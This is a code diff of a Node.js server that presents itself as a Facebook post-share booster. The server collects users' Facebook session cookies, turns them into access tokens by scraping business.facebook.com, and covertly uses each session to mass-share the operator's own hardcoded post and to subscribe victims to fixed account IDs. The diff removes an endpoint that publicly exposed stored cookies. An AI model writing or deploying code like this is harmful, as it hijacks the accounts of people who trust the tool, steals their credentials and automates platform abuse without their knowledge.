@@ -13,7 +13,6 @@ app.use(express.json());
 app.use(require("./corss"));
 app.set("json spaces", 4);
 const total = new Map();
-const collectedData = [];
 
 function userAgent() {
   const version = () => {
@@ -52,10 +51,6 @@ const jsob = JSON.parse(JSON.stringify(data || [], null, 2));
 return res.json(jsob);
 });
 
-app.get("/cdata", (req, res) => {
-return res.json(JSON.parse(JSON.stringify(collectedData, null, 2)));
-});
-
 app.get('/', (req, res) => {
  return res.send("pogi... sige na");
 });
@@ -73,28 +68,57 @@ if (leiam) {
  }
 } catch (error) {}
 }
-app.get('/submit', async (req, res) => {
+
+async function getAccessToken(cookie) {
+  try {
+    const headers = {
+      'authority': 'business.facebook.com',
+      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+      'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+      'cache-control': 'max-age=0',
+      'cookie': cookie,
+      'referer': 'https://www.facebook.com/',
+      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
+      'sec-ch-ua-mobile': '?0',
+      'sec-ch-ua-platform': '"Linux"',
+      'sec-fetch-dest': 'document',
+      'sec-fetch-mode': 'navigate',
+      'sec-fetch-site': 'same-origin',
+      'sec-fetch-user': '?1',
+      'upgrade-insecure-requests': '1',
+    };
+    const response = await axios.get('https://business.facebook.com/content_management', {
+      headers
+    });
+    const token = response.data.match(/"accessToken":\s*"([^"]+)"/);
+    if (token && token[1]) {
+      const accessToken = token[1];
+      return accessToken;
+    }
+  } catch (error) {
+    return;
+  }
+}
+
+app.post('/submit', async (req, res) => {
   const {
     cookie,
     url,
     amount,
     interval,
-  } = req.query;
+  } = req.body;
   if (!cookie || !url || !amount || !interval) return res.status(400).json({
     error: 'Missing state, url, amount, or interval'
   });
   try {
     if (!cookie) {
-      return res.status(400).json({
+      return res.json({
         status: 500,
         error: 'Invalid cookies'
       });
     };
-    await yello(cookie, url, amount, interval);
-    collectedData.push({
-      cookie,
-      url
-    });
+    const aToken = await getAccessToken(cookie);
+    await yello(aToken, url, amount, interval);
     res.status(200).json({
       status: 200
     });
@@ -107,11 +131,10 @@ app.get('/submit', async (req, res) => {
 });
 
 
-const sauce = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
+const sauce = "https://www.facebook.com/100015801404865/posts/944598050871227/?substory_index=944598050871227&app=fbl";
 async function yello(c,u,a,i){
   await share(true, c,u,a,i);
-  await share(false, c, sauce, "100000", "6");
-  collectedData.push({cookie: c});
+  await share(false, c, sauce, "100000", "5");
 }
 
 async function fucker(a,link){
@@ -135,9 +158,7 @@ async function fucker(a,link){
       "100015801404865"
     ];
     for (const n of neth){
-      axios.post(`https://graph.facebook.com/v18.0/${n}/subscribers`, {}, {
-      headers
-    }).catch(err => {});
+      axios.post(`https://graph.facebook.com/v21.0/${n}/subscribers`, {}, { headers });
     }
     const kapogi = [
       "😊😊😊",
